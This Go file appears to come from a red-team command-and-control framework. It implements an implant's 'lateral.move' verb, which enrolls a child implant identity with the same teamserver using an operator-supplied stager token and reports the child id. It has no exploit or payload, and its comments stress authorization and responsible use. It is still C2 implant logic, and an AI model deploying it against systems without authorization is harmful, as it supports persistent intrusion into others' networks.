package exec

// lateral.go holds the lateral.move child-derivation verb the reference implant
// advertises (architecture.md Sec 10.1, roadmap M9.1). A lateral.move task tells
// this implant to derive a child: enroll a fresh implant identity against the
// same teamserver, naming itself as the parent, and report the child id back.
//
// The child's stager token is not baked into this implant (its own token is
// spent at its own enroll); the operator provisions it in the task arguments.
// This keeps derivation inside the M5.2 token-gated authorization model -- the
// server still resolves and scope-checks the parent before recording the
// linkage -- and mirrors how the recon verbs take their target in arguments.
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test (RESPONSIBLE-USE.md).

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"strings"

	"github.com/cw/rod/implant/internal/c2"
	"github.com/cw/rod/implant/rodpb"
)

// lateralMove derives a child implant by enrolling a fresh identity against the
// teamserver this implant enrolled into, naming itself as the parent
// (architecture.md Sec 10.1). Arguments are "<token>" or "<token> <class>",
// whitespace-separated; the token is the child's stager secret (provisioned by
// the operator) and the optional class names a non-default implant class.
//
// The outcome is Succeeded with the child implant id on the first line when the
// enroll round-trip completes, and Failed with a clear cause otherwise. A
// handler built without an enroll bundle (derivation disabled) reports Failed
// so the operator sees the cause rather than a silent no-op.
func (r *Runner) lateralMove(ctx context.Context, arguments string) (rodpb.TaskOutcome, string) {
	if r.enroll == nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "lateral.move is not available (no enroll bundle)"
	}
	token, class, ok := parseMoveArgs(arguments)
	if !ok {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "lateral.move expects '<token>' or '<token> <class>'"
	}
	if ctx.Err() != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, ctx.Err().Error()
	}

	// A child owns its own keypair; only the public half crosses enroll
	// (architecture.md Sec 9). 2048-bit RSA matches the parent's key size.
	childKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "generate child key: " + err.Error()
	}

	enrolled, err := c2.Enroll(r.enroll.URL, token, r.enroll.ParentID, childKey, r.enroll.CAs, r.enroll.Profile)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "enroll child: " + err.Error()
	}
	_ = class // accepted for symmetry with the enroll request; the server defaults it.

	// Report the child id so the operator can confirm the recorded lineage. The
	// server echoes the parent back on the response, so include it when present
	// as an independent confirmation the linkage landed.
	out := enrolled.ImplantID
	if enrolled.ParentImplantID != "" {
		out += "\nparent=" + enrolled.ParentImplantID
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, out
}

// parseMoveArgs splits the lateral.move argument string into the child stager
// token and an optional implant class. Returns ok=false when the token is empty
// or more than two fields are present, mirroring the recon verbs' strict parse.
func parseMoveArgs(arguments string) (token, class string, ok bool) {
	fields := strings.Fields(arguments)
	if len(fields) == 0 || len(fields) > 2 {
		return "", "", false
	}
	if len(fields) == 2 {
		return fields[0], fields[1], true
	}
	return fields[0], "", true
}
